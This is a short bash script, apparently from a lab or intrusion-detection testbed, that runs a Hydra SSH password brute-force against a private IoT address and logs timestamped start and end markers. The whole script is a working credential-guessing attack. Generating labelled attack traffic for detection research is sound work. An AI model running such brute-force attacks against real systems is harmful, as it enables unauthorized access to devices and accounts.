#!/bin/bash
TARGET="192.168.50.20"
SRC_IP=$(hostname -i | awk '{print $1}')
START=$(date -u +"%Y-%m-%dT%H:%M:%SZ")
echo "$START,BRUTEFORCE_START,$SRC_IP,$TARGET"

hydra -l iotuser -P /usr/share/wordlists/lab_passwords.txt \
    ssh://"$TARGET" -o /data/hydra_result.txt 2>/dev/null

END=$(date -u +"%Y-%m-%dT%H:%M:%SZ")
echo "$END,BRUTEFORCE_END,$SRC_IP,$TARGET"
